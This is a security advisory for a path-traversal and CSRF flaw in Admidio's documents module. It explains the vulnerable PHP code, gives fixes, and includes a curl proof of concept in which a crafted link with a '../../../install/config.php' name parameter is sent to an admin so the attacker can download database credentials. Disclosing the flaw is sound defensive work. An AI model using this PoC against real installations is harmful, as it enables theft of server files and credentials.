# [M] Admidio has Path Traversal via Unvalidated `name` Parameter in Document Add Mode that Enables Arbitrary Server File Read

## Summary
Severity: Medium
Advisory: GHSA-m9h6-8pqm-xrhf
CVE: CVE-2026-41656
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-m9h6-8pqm-xrhf
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The `add` mode in `modules/documents-files.php` accepts a `name` parameter validated only as `'string'` type (HTML encoding), allowing path traversal characters (`../`) to pass through unfiltered. Combined with the absence of CSRF protection on this endpoint and `SameSite=Lax` session cookies, a low-privileged attacker can trick a documents administrator into clicking a crafted link that registers an arbitrary server file (e.g., `install/config.php` containing database credentials) into a documents folder accessible to the attacker.

## Details

**Root cause — incorrect input validation type (modules/documents-files.php:222):**

```php
case 'add':
    $getName = admFuncVariableIsValid($_GET, 'name', 'string');
```

The `'string'` type in `admFuncVariableIsValid()` only applies `SecurityUtils::encodeHTML(StringUtils::strStripTags($value))` (system/bootstrap/function.php:414-416). Since `../` contains no HTML special characters (`<`, `>`, `&`, `"`, `'`), path traversal sequences pass through unchanged.

The correct type would be `'file'`, which calls `StringUtils::strIsValidFileName()` (src/Infrastructure/Utils/StringUtils.php:217-236). This function checks `basename($filename) !== $filename` at line 228, which would reject any path containing directory separators.

**Missing CSRF protection (modules/documents-files.php:221-238):**

```php
case 'add':
    $getName = admFuncVariableIsValid($_GET, 'name', 'string');

    if (!$gCurrentUser->isAdministratorDocumentsFiles()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $folder = new Folder($gDb);
    $folder->readDataByUuid($getFolderUUID);
    $folder->addFolderOrFileToDatabase($getName);
    // ...
```

No `SecurityUtils::validateCsrfToken()` or form object validation. Compare with `folder_delete` (line 140) and `file_delete` (line 170) which both validate CSRF tokens. The `add` action operates entirely via GET parameters.

**Unsafe path construction (src/Documents/Entity/Folder.php:121-135):**

```php
public function addFolderOrFileToDatabase(string $newFolderFileName): void
{
    $newFolderFileName = urldecode($newFolderFileName);
    $newObjectPath = $this->getFullFolderPath() . '/' . $newFolderFileName;
    // ...
    if (is_file($newObjectPath)) {
        $newFile = new File($this->db);
        $newFile->setValue('fil_fol_id', $folderId);
        $newFile->setValue('fil_name', $newFolderFileName);  // traversal stored in DB
        // ...
        $newFile->save();
    }
}
```

No `realpath()` comparison or `basename()` check. The traversal filename (e.g., `../../../install/config.php`) is stored verbatim as `fil_name` in the database.

**File served on download (src/Documents/Entity/File.php:88-91, src/Documents/Service/DocumentsService.php:68-119):**

```php
// File.php:88-91
public function getFullFilePath(): string
{
    return $this->getFullFolderPath() . '/' . $this->getValue('fil_name', 'database');
}

// DocumentsService.php:75-118
$completePath = $file->getFullFilePath();  // reconstructs traversal path
// ...
readfile($completePath);  // serves arbitrary file
```

**SameSite=Lax allows cross-site GET (src/Session/Entity/Session.php:544):**

```php
'samesite' => 'lax'
```

Top-level GET navigations from cross-site origins include the session cookie, enabling the CSRF attack vector.

## PoC

**Prerequisites:** Attacker has a regular user account with access to the documents module. A documents administrator is available to be social-engineered.

```bash
# Step 1: As regular user, browse the documents module to obtain a public folder UUID
curl -b 'attacker_session' 'https://target.com/modules/documents-files.php?mode=list'
# Note a folder_uuid from the response, e.g., "550e8400-e29b-41d4-a716-446655440000"

# Step 2: Craft a link targeting install/config.php (adjust ../ depth for folder nesting)
# For a folder at adm_my_files/documents/Photos/, use three levels:
PAYLOAD_URL='https://target.com/modules/documents-files.php?mode=add&folder_uuid=550e8400-e29b-41d4-a716-446655440000&name=../../../install/config.php'

# Step 3: Send this link to a documents administrator (email, chat, etc.)
# When the admin clicks it, the server's install/config.php is registered in the Photos folder
# The admin sees a redirect back to the documents page (normal behavior)

# Step 4: As attacker, list the folder to find the new file entry
curl -b 'attacker_session' 'https://target.com/modules/documents-files.php?mode=list&folder_uuid=550e8400-e29b-41d4-a716-446655440000'
# The traversal file appears in the listing with its file_uuid

# Step 5: Download the file using its UUID
curl -b 'attacker_session' 'https://target.com/modules/documents-files.php?mode=download&file_uuid=<FILE_UUID>'
# Response contains the contents of install/config.php, including:
# $g_adm_srv  (database host)
# $g_adm_usr  (database username)
# $g_adm_pw   (database password)
# $g_adm_db   (database name)
```

## Impact

- **Arbitrary server file read**: An attacker can read any file on the server that the web server process has read access to, including `install/config.php` (database credentials), `/etc/passwd`, application source code, and other configuration files.
- **Database credential exposure**: The primary target `install/config.php` contains plaintext database credentials, enabling direct database access and full compromise of the Admidio installation.
- **Low attack complexity**: The CSRF vector requires only that an admin clicks a single link — no JavaScript, no form submission, no special browser behavior.

## Recommended Fix

**Fix 1 — Use `'file'` validation type for the `name` parameter (modules/documents-files.php:222):**

```php
// Before (vulnerable):
$getName = admFuncVariableIsValid($_GET, 'name', 'string');

// After (fixed):
$getName = admFuncVariableIsValid($_GET, 'name', 'file');
```

This invokes `StringUtils::strIsValidFileName()` which checks `basename($filename) !== $filename` and rejects any path containing directory traversal.

**Fix 2 — Add CSRF protection to the `add` mode (modules/documents-files.php:221-238):**

Change the `add` action from GET to POST and add CSRF token validation:

```php
case 'add':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $getName = admFuncVariableIsValid($_POST, 'name', 'file');

    if (!$gCurrentUser->isAdministratorDocumentsFiles()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $folder = new Folder($gDb);
    $folder->readDataByUuid($getFolderUUID);
    $folder->addFolderOrFileToDatabase($getName);
    // ...
```

**Fix 3 (defense in depth) — Add path canonicalization in `addFolderOrFileToDatabase()` (src/Documents/Entity/Folder.php):**

```php
public function addFolderOrFileToDatabase(string $newFolderFileName): void
{
    $newFolderFileName = urldecode($newFolderFileName);
    $newObjectPath = $this->getFullFolderPath() . '/' . $newFolderFileName;

    // Ensure the resolved path is within the folder directory
    $realPath = realpath($newObjectPath);
    $folderPath = realpath($this->getFullFolderPath());
    if ($realPath === false || !str_starts_with($realPath, $folderPath . '/')) {
        throw new Exception('SYS_FILENAME_INVALID');
    }
    // ... rest of method
}
```

All three fixes should be applied for defense in depth.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-m9h6-8pqm-xrhf
- https://nvd.nist.gov/vuln/detail/CVE-2026-41656
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
